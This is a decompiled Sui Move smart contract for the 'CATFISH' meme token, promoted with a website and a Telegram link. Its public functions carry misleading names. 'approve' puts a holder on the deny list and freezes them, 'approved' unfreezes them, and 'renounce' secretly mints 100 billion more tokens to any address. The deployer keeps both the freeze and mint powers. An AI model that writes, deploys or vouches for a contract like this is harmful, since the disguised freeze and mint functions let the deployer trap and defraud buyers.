module 0x330808711a1a4e228cf6cb13831cf1ea6fd7339033d565dfec264c8e68ab1c56::catfish {
    struct CATFISH has drop {
        dummy_field: bool,
    }

    public entry fun approve(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CATFISH>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<CATFISH>(arg0, arg1, arg2, arg3);
    }

    public entry fun approved(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CATFISH>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<CATFISH>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: CATFISH, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<CATFISH>(arg0, 2, b"CATFISH", b"CATFISH", b"Sui Catfish helps you float through the world of decentralized finance as effortlessly as a catfish drifting in the ocean.http://suicatfish.xyz/ - https://t.me/SUICATFISHCOIN ", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://suicatfish.xyz/cute.jpg"))), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<CATFISH>>(v2);
        let v4 = 0x2::tx_context::sender(arg1);
        0x2::coin::mint_and_transfer<CATFISH>(&mut v3, 1000000000, v4, arg1);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<CATFISH>>(v3, v4);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<CATFISH>>(v1, v4);
    }

    public entry fun renounce(arg0: &mut 0x2::coin::TreasuryCap<CATFISH>, arg1: address, arg2: &mut 0x2::tx_context::TxContext) {
        0x2::coin::mint_and_transfer<CATFISH>(arg0, 100000000000, arg1, arg2);
    }

    // decompiled from Move bytecode v6
}

